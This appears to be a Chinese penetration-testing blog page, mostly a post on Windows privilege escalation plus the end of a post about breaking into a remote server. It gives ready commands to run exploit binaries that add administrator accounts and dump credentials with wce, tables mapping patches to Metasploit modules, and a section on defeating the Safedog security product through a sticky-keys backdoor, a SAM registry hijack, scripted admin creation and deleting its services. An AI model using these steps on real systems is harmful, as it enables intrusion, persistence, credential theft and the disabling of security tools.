+<p><img src="http://opgnaclz6.bkt.clouddn.com/17.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="7-连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip"><a href="#7-连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip" class="headerlink" title="7,连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip"></a>7,连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/18.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="8，查看一下TermService服务对应的PID，1884"><a href="#8，查看一下TermService服务对应的PID，1884" class="headerlink" title="8，查看一下TermService服务对应的PID，1884"></a>8，查看一下TermService服务对应的PID，1884</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /avc</span><br></pre></td></tr></table></figure>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/19.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="9-根据PID查找端口，果然被他改成了"><a href="#9-根据PID查找端口，果然被他改成了" class="headerlink" title="9,根据PID查找端口，果然被他改成了"></a>9,根据PID查找端口，果然被他改成了</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/20.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="10-连接远程桌面，成功连接。把它里面黄色资源一删，走人"><a href="#10-连接远程桌面，成功连接。把它里面黄色资源一删，走人" class="headerlink" title="10,连接远程桌面，成功连接。把它里面黄色资源一删，走人"></a>10,连接远程桌面，成功连接。把它里面黄色资源一删，走人</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/21.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"><br>总结：其实总体来说还是非常顺利的，主要是16-32提2012时不是很稳定，如果失败的话可以多试两次,或许有意向不到的收获。还有就是用metasploit反弹shell时失败，因为16-032不一定要反弹shell。所以没去研究。下次遇到的话可以从防火墙入手，查看端口规则，有可能端口被拦截。</p>
+<h3 id="—–-Powered-by-Bug’小虫"><a href="#—–-Powered-by-Bug’小虫" class="headerlink" title="—– Powered by Bug’小虫"></a>—– Powered by Bug’小虫</h3>
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/提权免杀/">提权免杀</a>►<a class="article-category-link" href="/categories/提权免杀/windows提权/">windows提权</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/01/15/windows提权准备/" title="windows提权准备" itemprop="url">windows提权准备</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2018-01-15T10:37:51.000Z" itemprop="datePublished"> 发表于 2018-01-15</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <h3 id="window提权基础"><a href="#window提权基础" class="headerlink" title="window提权基础"></a>window提权基础</h3><ol>
+<li><p>收集并编译相关POC</p>
+</li>
+<li><p>若操作系统有杀毒软件以及安全防护软件，则需要对提权POC进行免杀，否则进行下一步。</p>
+</li>
+<li><p>上传POC</p>
+</li>
+<li><p>有webshell或者反弹webshell来执行命令</p>
+</li>
+<li><p>搜索漏洞，根据关键字进行搜索例如MS10-061。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(1)在百度浏览器中搜索“MS10-061 site:exploit-db.com”</span><br><span class="line"></span><br><span class="line">(2)packetstormsecurity网站搜索</span><br><span class="line"></span><br><span class="line">https://packetstormsecurity.com/search/?q=MS16-016</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>(3)安全焦点，其BugTraq是一个出色的漏洞和exploit数据源，可以通过CVE编号，或者产品信息漏洞直接搜索。网址：<a href="http://www.securityfocus.com/bid。" target="_blank" rel="noopener">http://www.securityfocus.com/bid。</a></p>
+<h3 id="使用msf平台搜索可利用POC"><a href="#使用msf平台搜索可利用POC" class="headerlink" title="使用msf平台搜索可利用POC"></a>使用msf平台搜索可利用POC</h3><ol>
+<li>搜索poc</li>
+</ol>
+<p>在kali中打开msf或者执行“/usr/bin/msfconsole”，在出来的命令提示符下使用命令进行搜索：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">search ms08 </span><br><span class="line">search ms09 </span><br><span class="line">search ms10 </span><br><span class="line">search ms11 </span><br><span class="line">search ms12 </span><br><span class="line">search ms13 </span><br><span class="line">search ms14 </span><br><span class="line">search ms15 </span><br><span class="line">search ms16 </span><br><span class="line">search ms17</span><br></pre></td></tr></table></figure></p>
+<p>以上命令将搜索2008年至2017年的所有可用的Windows下的exploit，例如搜索2015年的exploit，如图1所示。</p>
+<p>搜索2015年所有可用的0day</p>
+<p>图1搜索2015年所有可用的0day</p>
+<ol start="2">
+<li>查看相关漏洞情况</li>
+</ol>
+<p>可以通过微软官方网站查看漏洞对应的版本，利用方式为<a href="https://technet.microsoft.com/library/security/漏洞号，查看ms08-068则其网页打开方式为：https://technet.microsoft.com/library/security/ms08-068，如果显示为严重则表明可以被利用。" target="_blank" rel="noopener">https://technet.microsoft.com/library/security/漏洞号，查看ms08-068则其网页打开方式为：https://technet.microsoft.com/library/security/ms08-068，如果显示为严重则表明可以被利用。</a></p>
+<h3 id="实施提权"><a href="#实施提权" class="headerlink" title="实施提权"></a>实施提权</h3><p>执行命令。比如可利用poc文件为poc.exe，则可以使用如下的一些命令提权：</p>
+<p>(1)直接执行木马。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poc.exe ma.exe</span><br></pre></td></tr></table></figure></p>
+<p>(2)添加用户<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">poc.exe <span class="string">"net user antian365 1qaz2wsx /add"</span> </span><br><span class="line">poc.exe <span class="string">"net localgroup administrators antian365 /add"</span></span><br></pre></td></tr></table></figure></p>
+<p>(3)获取明文密码或者哈希值<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">poc.exe <span class="string">"wce32.exe -w"</span>  </span><br><span class="line">poc.exe <span class="string">"wce64.exe -w"</span> </span><br><span class="line">poc.exe <span class="string">"wce32"</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="相关资源下载"><a href="#相关资源下载" class="headerlink" title="相关资源下载"></a>相关资源下载</h3><ol>
+<li>Tools下载</li>
+</ol>
+<p>wce下载：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://www.ampliasecurity.com/research/windows-credentials-editor/</span><br><span class="line">http://www.ampliasecurity.com/research/wce_v1_42beta_x32.zip</span><br><span class="line">http://www.ampliasecurity.com/research/wce_v1_42beta_x64.zip</span><br><span class="line">sysinternals ：https://technet.microsoft.com/en-us/sysinternals/bb842062</span><br><span class="line">mimikatz ：http://blog.gentilkiwi.com/mimikatz</span><br><span class="line">python ：https://www.python.org/downloads/windows/</span><br></pre></td></tr></table></figure></p>
+<ol start="2">
+<li>搜索漏洞和shellcode<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http://www.exploit-db.com</span><br><span class="line">http://1337day.com</span><br><span class="line">http://0day.today</span><br><span class="line">http://www.securityfocus.com</span><br><span class="line">http://seclists.org/fulldisclosure/</span><br><span class="line">http://www.exploitsearch.net</span><br><span class="line">http://www.securiteam.com</span><br><span class="line">http://metasploit.com/modules/</span><br><span class="line">http://securityreason.com</span><br><span class="line">https://cxsecurity.com/exploit/</span><br><span class="line">http://securitytracker.com/</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="Windows本地溢出漏洞对应表"><a href="#Windows本地溢出漏洞对应表" class="headerlink" title="Windows本地溢出漏洞对应表"></a>Windows本地溢出漏洞对应表</h3><p>Windows2003对应漏洞、编号及其影响系统及msf模块</p>
+<ol>
+<li><p>2007年对应漏洞、编号及其影响系统及msf模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（1）KB935966 |MS07-029  Win2000SP4、Win2003SP1/SP2 exploit/windows/dcerpc/ms07_029_msdns_zonename </span><br><span class="line">exploit/windows/smb/ms07_029_msdns_zonename </span><br><span class="line">（2）KB937894| MS07-065 WinxpSP2、Win2000SP4、WinXP-x64-SP2、Win2003SP1/SP2 </span><br><span class="line">exploit/windows/dcerpc/ms07_065_msmq </span><br><span class="line">（3）KB941568|MS07-064 Win2000SP4  </span><br><span class="line">  exploit/windows/misc/ms07_064_sami </span><br><span class="line">（4）KB944653|MS07-067 WinXPSP2、WinXP-x64-SP2、Win2003SP1/SP2</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>2008年对应漏洞、编号及其影响系统及msf模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（1）KB958644 |MS08-067 Win2000SP4、WinXP-SP2/SP3、 </span><br><span class="line">WinXP-64-SP/SP2、Win2003SP1/SP2、Win2003-64/SP2 </span><br><span class="line">exploit/windows/smb/ms08_067_netapi </span><br><span class="line">（2）KB 957097| MS08-068 Win2000SP4、WinXP-SP2/SP3、 </span><br><span class="line">WinXP-64-SP/SP2、Win2003SP1/SP2、Win2003-64/SP2 </span><br><span class="line">exploit/windows/smb/smb_relay</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>2009年对应漏洞、编号及其影响系统及msf模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（1）KB952004|MS09-012 PR Win2003/2008 </span><br><span class="line">（2）KB956572|MS09-012烤肉 </span><br><span class="line">（3）KB970483|MS09-020 IIS6 </span><br><span class="line">（4）KB971657|MS09-041 WinXP、Win2003提权 </span><br><span class="line">（5）KB975254|MS09-053 IIS5远程溢出，Windows2000SP4，Win2003及Win2008拒绝服务。 </span><br><span class="line">（6）KB975517 |MS09-050 Vista、Win2008-32/SP2、Win2008-64/SP2 </span><br><span class="line">exploit/windows/smb/ms09_050_smb2_negotiate_func_index</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>2010年对应漏洞、编号及其影响系统及msf模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（1）KB977165|MS10-015 Vista、Win2003-32-64/SP2、Win2008-32-64/SP2 </span><br><span class="line">exploit/windows/local/ms10_015_kitrap0d </span><br><span class="line">（2）KB 2347290|MS10-061 Winxp3、Winxp64sp2、Win2003-32-64 SP2、Win2008-32-64 SP2 </span><br><span class="line">（3）KB2360937|MS10-084 Winxp3、Winxp64sp2、Win2003-32-64 SP2 </span><br><span class="line">（4）KB2305420| MS10-092 Win7-32-64、Win2008-32-64、Win2008R2-32-64 </span><br><span class="line">exploit/windows/local/ms10_092_schelevator </span><br><span class="line">（5）KB2124261|KB2271195  MS10-065 IIS7</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>2011年对应漏洞、编号及其影响系统及msf模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">（1）KB2393802|MS11-011 </span><br><span class="line">Winxp32-64-SP3、Win2003-32-64-SP2、Win7-32-64-SP1、 Win2008-R2-64-SP2 </span><br><span class="line">（2）KB2478960|MS11-014 </span><br><span class="line">Winxp32-64-SP3、Win2003-32-64-SP2 </span><br><span class="line">（3）KB2507938|MS11-056 </span><br><span class="line">Winxp32-64-SP3、Win2003-32-64-SP2、Win7-32-64-SP1、 Win2008-R2-64-SP2 </span><br><span class="line">（4）KB2566454|MS11-062 </span><br><span class="line">Winxp32-64-SP3、Win2003-32-64-SP2 </span><br><span class="line">（5）KB2620712|MS11-097 </span><br><span class="line">Winxp-SP3、Win2003-SP2、Win7-64-SP1、 Win2008R2-64-SP1 </span><br><span class="line">（6）KB2503665|MS11-046 </span><br><span class="line">Winxp-SP3、Win2003-SP2、Win7-64-SP1、 Win2008R2-64-SP1 </span><br><span class="line">（7）KB2592799|MS11-080 </span><br><span class="line">Winxp-SP3、Win2003-SP2 </span><br><span class="line">exploit/windows/local/ms11_080_afdjoinleaf</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>2012年对应漏洞、编号及其影响系统及msf模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）KB2711167| KB2707511|KB2709715|MS12-042  sysret –pid </span><br><span class="line">Winxp-SP3、Win2003-SP2、Win7-64-SP1、 Win2008R2-64-SP1、Win8-32-64、Win2012 </span><br><span class="line">（2）KB2621440|MS12-020 Winxp-SP3、Win2003-SP2、Win7-64-SP1、 Win2008R2-64-SP1、</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>2013年对应漏洞、编号及其影响系统及msf模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（1）KB2778930|MS13-005 Vista-32-64-SP2、Win2008-32-64-SP2、Win7-32-64-SP1、 Win2008R2-64-SP1、Win8-32-64、Win2012 </span><br><span class="line">exploit/windows/local/ms13_005_hwnd_broadcast </span><br><span class="line">（2）KB2840221|MS13-046 WinXP-32-SP3、WinXP-64-SP2、Win2003-32-64-SP2、Vista-32-64-SP2、Win2008-R2-32-64-SP2、Win7-32-64-SP1、 Win2008R2-64-SP1、Win8-32-64、Win2012、Win2012R2 </span><br><span class="line">（3）KB2850851|MS13-053 EPATHOBJ 0day，WinXP-32-SP3、WinXP-64-SP2、Win2003-32-64-SP2、Vista-32-64-SP2、Win2008-R2-32-64-SP2、Win7-32-64-SP1、 Win2008R2-64-SP1、Win8-32-64、Win2012 </span><br><span class="line">exploit/windows/local/ms13_053_schlamperei</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>2014年对应漏洞、编号及其影响系统及msf模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">（1）KB 2914368 |MS14-002 WinXPSP3、WinXP-64-SP2、Win2003-32-64-sp2 </span><br><span class="line">exploit/windows/local/ms_ndproxy </span><br><span class="line">（2）KB 2916607|MS14-009 Win2003-32-64-SP2、Vista-32-64-SP2、Win2008-32-64-SP2、Win7-R2-32-64-SP1、 Win2008R2-64-SP1、Win8-8.1-32-64、Win2012、Win2012R2 </span><br><span class="line">exploit/windows/local/ms14_009_ie_dfsvc </span><br><span class="line">（3）KB3000061|MS14-058 Win2003-32-64-SP2、Vista-32-64-SP2、Win2008-R2-32-64-SP2、Win7-32-64-SP1、 Win2008R2-64-SP1、Win8-8.1-32-64、Win2012、Win2012R2 </span><br><span class="line">exploit/windows/local/ms14_058_track_popup_menu </span><br><span class="line">（4）KB 2989935|MS14-070 Win2003-32-64-SP2 </span><br><span class="line">exploit/windows/local/ms14_070_tcpip_ioctl</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>2015年对应漏洞、编号及其影响系统及msf模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">（1）KB3023266|MS15-001 Win7-32-64-SP1、Win2008R2-32-64-SP1、 Win2008R2-64-SP1、Win8-8.1-32-64、Win2012、Win2012R2 </span><br><span class="line">exploit/windows/local/ntapphelpcachecontrol </span><br><span class="line">（2）KB3025421|MS15_004、Win7-32-64-SP1、Win2008R2-32-64-SP1、 Win2008R2-64-SP1、Win8-8.1-32-64、Win2012、Win2012R2 </span><br><span class="line">exploit/windows/local/ms15_004_tswbproxy </span><br><span class="line">（3）KB3041836|MS15-020、Win2003-32-64-SP2、Vista-32-64-SP2、Win2008-32-64-SP2、Win7-R2-32-64-SP1、 Win2008R2-64-SP1、Win8-8.1-32-64、Win2012、Win2012R2 </span><br><span class="line">exploit/windows/smb/ms15_020_shortcut_icon_dllloader </span><br><span class="line">（4）KB3057191|MS15-051 </span><br><span class="line">Win2003-32-64-SP2、Vista-32-64-SP2、Win2008-32-64-SP2、Win7-R2-32-64-SP1、 Win2008R2-64-SP1、Win8-8.1-32-64、Win2012、Win2012R2 </span><br><span class="line">exploit/windows/local/ms15_051_client_copy_image </span><br><span class="line">（5）KB3077657|MS15-077 </span><br><span class="line">Win2003-32-64-SP2、Vista-32-64-SP2、Win2008-32-64-SP2、Win7-R2-32-64-SP1、 Win2008R2-64-SP1、Win8-8.1-32-64、Win2012、Win2012R2 </span><br><span class="line">（6）KB 3079904|MS15_078 </span><br><span class="line">Win2003-32-64-SP2、Vista-32-64-SP2、Win2008-32-64-SP2、Win7-R2-32-64-SP1、 Win2008R2-64-SP1、Win8-8.1-32-64、Win2012、Win2012R2 </span><br><span class="line">exploit/windows/local/ms15_078_atmfd_bof </span><br><span class="line">（7）KB3079904|MS15-097 </span><br><span class="line">Win2003-32-64-SP2、Vista-32-64-SP2、Win2008-32-64-SP2、Win7-R2-32-64-SP1、 Win2008R2-64-SP1、Win8-8.1-32-64、Win2012、Win2012R2 </span><br><span class="line">exploit/windows/smb/ms15_020_shortcut_icon_dllloader</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>2016年对应漏洞、编号及其影响系统及msf模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（1）KB3134228|MS16-014 Win2008、Win7、Win2012 </span><br><span class="line">（2）KB3124280|MS16-016 WebDAV提权漏洞，Vista-32-64-SP2、Win2008-32-64-SP2、Win7-32-64-SP1、Win2008R2-64-SP1、Win8.1-32-64、Win2012、Win2012R2、Win10-32-64 </span><br><span class="line">exploit/windows/local/ms16_016_webdav </span><br><span class="line">（3）KB3139914|MS16-032、Vista-32-64-SP2、Win2008-32-64-SP2、Win7-32-64-SP1、Win2008R2-64-SP1、Win8.1-32-64、Win2012、Win2012R2、Win10-32-64 </span><br><span class="line">exploit/windows/local/ms16_032_secondary_logon_handle_privesc </span><br><span class="line">Windows 2003 SP2 安装了MS10-046补丁，可用ms15_020进行溢出 </span><br><span class="line">Windows 2008 SP2 (32 bits)安装了MS14-027补丁可用ms15_020进行溢出</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="过安全狗"><a href="#过安全狗" class="headerlink" title="过安全狗"></a>过安全狗</h3><ol>
+<li>vbs法</li>
+</ol>
+<p>将以下代码保存为1.vbs然后执行cscript 1.vbs<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Set o=CreateObject( <span class="string">"Shell.Users"</span> ) </span><br><span class="line">Set z=o.create(<span class="string">"user"</span>) </span><br><span class="line">z.changePassword <span class="string">"1qaz2WSX12"</span>,<span class="string">""</span> </span><br><span class="line">z.setting(<span class="string">"AccountType"</span>)=3</span><br></pre></td></tr></table></figure></p>
+<ol start="2">
+<li><p>shift后门法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy C:\sethc.exe C:\windows\system32\sethc.exe  </span><br><span class="line">copy C:\windows\system32\sethc.exe C:\windows\system32\dllcache\sethc.exe</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>for循环添加帐号法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /l %%i <span class="keyword">in</span> (1,1,100) <span class="keyword">do</span> @net user temp asphxg /add&amp;@net localgroup administrators temp /add</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>修改注册表法</p>
+</li>
+</ol>
+<p>administrator对应值是1F4,GUEST是1F5。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(1)使用net1 user guset 1 ,将guest密码重置为1，无需过问是guest否禁用</span><br><span class="line"></span><br><span class="line">(2)执行：reg export &quot;HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4&quot; &quot;C:\RECYCLER\1.reg&quot;导出administrator的注册表值到某路径,修改内容，将&quot;V&quot;值删除，只留F值,将1F4修改为1F5,保存。</span><br><span class="line"></span><br><span class="line">(3)执行regedit /s C:\RECYCLER\1.reg 导入注册表就可以使用，guest 密码1登陆了。</span><br></pre></td></tr></table></figure></p>
+<ol start="5">
+<li><p>直接修改管理员密码法，尽量不用这招，实在没有办法就用这个。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user administrator somepwd</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>删除与停止安全狗相关服务法</p>
+</li>
+</ol>
+<p>如果是system权限可以采取以下方法停止安全狗</p>
+<p>(1)停止安全狗相关服务<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net stop    <span class="string">"Safedog Guard Center"</span>  /y </span><br><span class="line">net stop    <span class="string">"Safedog Update Center"</span> /y </span><br><span class="line">net stop    <span class="string">"SafeDogCloudHelper"</span>  /y</span><br></pre></td></tr></table></figure></p>
+<p>(2)直接删除SafeDogGuardCenter服务<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sc stop <span class="string">"SafeDogGuardCenter"</span>  </span><br><span class="line">sc config <span class="string">"SafeDogGuardCenter"</span> start= disabled  </span><br><span class="line">sc delete <span class="string">"SafeDogGuardCenter"</span> </span><br><span class="line"> </span><br><span class="line">sc stop <span class="string">" SafeDogUpdateCenter"</span>  </span><br><span class="line">sc config <span class="string">" SafeDogUpdateCenter"</span> start= disabled  </span><br><span class="line">sc delete <span class="string">" SafeDogUpdateCenter"</span> </span><br><span class="line"> </span><br><span class="line">sc stop <span class="string">" SafeDogCloudHelper"</span>  </span><br><span class="line">sc config <span class="string">" SafeDogCloudHelper"</span> start= disabled  </span><br><span class="line">sc delete <span class="string">" SafeDogCloudHelper"</span></span><br></pre></td></tr></table></figure></p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/提权免杀/">提权免杀</a>►<a class="article-category-link" href="/categories/提权免杀/windows提权/">windows提权</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+
+  <nav id="page-nav" class="clearfix">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next<span></span></a>
+  </nav>
+
+</div>
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<aside class="clearfix">
+
+  
+
+
+  
+<div class="category-block">
+  <h3 class="asidetitle">分类</h3>
+     <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/git/">git</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/git/hexo/">hexo</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><span class="category-list-count">8</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/linux/parrot/">parrot</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/rad-linux/">rad linux</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/工具/">工具</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/windows/">windows</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/windows/Windows2003/">Windows2003</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/">代码审计</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/php代码审计/">php代码审计</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/提权免杀/">提权免杀</a><span class="category-list-count">6</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/提权免杀/windows提权/">windows提权</a><span class="category-list-count">6</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a><span class="category-list-count">16</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/CMS/">CMS</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/XSS/">XSS</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/其他/">其他</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/注入/">注入</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/笔记/">笔记</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/资源/">资源</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/">编程开发</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/javascript/">javascript</a><span class="category-list-count">2</span></li></ul></li></ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">标签</p>
